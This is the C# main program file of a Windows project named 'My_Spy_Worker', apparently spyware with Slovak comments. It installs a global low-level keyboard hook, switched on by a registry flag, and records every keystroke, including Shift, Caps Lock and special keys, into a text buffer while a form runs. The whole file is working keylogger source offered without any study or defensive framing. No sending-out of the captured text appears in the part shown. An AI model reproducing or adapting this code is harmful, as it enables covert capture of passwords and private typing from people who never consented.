using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace My_Spy_Worker
{
    static class Program
    {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        static extern int MapVirtualKey(uint uCode, uint uMapType);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);


        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            RegistryKey registry = Registry.LocalMachine.OpenSubKey("Software\\My_Spy\\Settings", false);
            bool Keyloggerenabled = bool.Parse((string)registry.GetValue("Keylogger", "False"));

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            if (Keyloggerenabled)
            {
                if (Control.IsKeyLocked(Keys.CapsLock))
                {
                    KeyInfo.Text.Append("[Caps ON]");
                    KeyInfo.Capital = true;
                }
                else
                {
                    KeyInfo.Text.Append("[Caps OFF]");
                    KeyInfo.Capital = false;
                }
                _hookID = SetHook(_proc);
            }
            Application.Run(new Form1());

            if (Keyloggerenabled)
                UnhookWindowsHookEx(_hookID);
        }


        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                bool specialcode = false;

                //Specialne tlacidla

 
                if(vkCode>111 && vkCode<124)
                {
                    KeyInfo.Text.Append("[" + (Keys)vkCode + "]");
                }


                switch ((Keys)vkCode)
                {
                    case Keys.CapsLock:
                        if (!Control.IsKeyLocked(Keys.CapsLock))
                        {
                            KeyInfo.Text.Append("[Caps ON]");
                            KeyInfo.Capital = true;
                        }
                        else
                        {
                            KeyInfo.Text.Append("[Caps OFF]");
                            KeyInfo.Capital = false;
                        }
                        specialcode = true;
                        break;
                    case Keys.Back:
                        KeyInfo.Text.Append("[<-]");
                        // KeyInfo.Text = KeyInfo.Text.Remove((KeyInfo.Text.Length - KeyInfo.LastKey.Length));
                        specialcode = true;
                        break;
                    case Keys.Enter:
                        KeyInfo.Text.Append(Environment.NewLine);
                        specialcode = true;
                        break;
                    case Keys.Space:
                        KeyInfo.Text.Append(" ");
                        specialcode = true;
                        break;
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                        KeyInfo.Text.Append("[Shift]");
                        specialcode = true;
                        break;
                    case Keys.LMenu:
                    case Keys.RMenu:
                        KeyInfo.Text.Append("[Crtrl+Alt]");
                        specialcode = true;
                        break;
                    case Keys.RControlKey:
                    case Keys.LControlKey:
                        KeyInfo.Text.Append("[Ctrl]");
                        specialcode = true;
                        break;
                    case Keys.LWin:
                        KeyInfo.Text.Append("[Windows]");
                        specialcode = true;
                        break;
                    case Keys.Escape:
                        KeyInfo.Text.Append("[Esc]");
                        specialcode = true;
                        break;
                    case Keys.Home:
                        KeyInfo.Text.Append("[Home]");
                        specialcode = true;
                        break;
                    case Keys.End:
                        KeyInfo.Text.Append("[End]");
                        specialcode = true;
                        break;
                    case Keys.PageUp:
                        KeyInfo.Text.Append("[PageUp]");
                        specialcode = true;
                        break;
                    case Keys.PageDown:
                        KeyInfo.Text.Append("[PageDown]");
                        specialcode = true;
                        break;
                    case Keys.Insert:
                        KeyInfo.Text.Append("[Insert]");
                        specialcode = true;
                        break;
                    case Keys.NumLock:
                        KeyInfo.Text.Append("[Numlock]");
                        specialcode = true;
                        break;
                }

                Debug.WriteLine(""+(Keys)vkCode);

                bool cap = KeyInfo.Capital;


                if (Control.ModifierKeys == Keys.Shift)
                {
                    cap = !cap;
                }




                int nonVirtualKey = MapVirtualKey((uint)vkCode, 2);

                if (nonVirtualKey > 0)
                {
                    char key = Convert.ToChar(nonVirtualKey);


                    if (!cap)
                        key = char.ToLower(key);



                    if (!specialcode)
                    {
                        KeyInfo.Text.Append(key);
                    }


                }

            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }




    }//koniec programu
}
